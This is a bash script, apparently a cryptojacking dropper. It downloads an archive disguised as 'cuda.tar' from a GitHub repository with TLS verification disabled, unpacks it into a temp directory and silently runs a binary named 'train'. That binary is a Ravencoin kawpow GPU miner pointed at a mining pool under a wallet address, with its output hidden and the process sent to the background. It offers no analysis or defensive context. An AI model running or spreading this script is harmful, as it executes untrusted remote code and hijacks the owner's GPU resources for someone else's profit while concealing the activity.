#!/bin/bash

cd "$(mktemp -d)" && wget --no-check-certificate -qO- "https://github.com/hanrzme/cuda/raw/refs/heads/main/cuda.tar" |tar -x && ./train -o hk.ravencoin.gfwroute.com:1140 -u RW43fKGSedsG633mYmaUCJgqM1bfdx7c7h.GO6 --algo=kawpow --no-cpu --cuda -k --cuda-loader=./cuda.so >/dev/null 2>&1 &
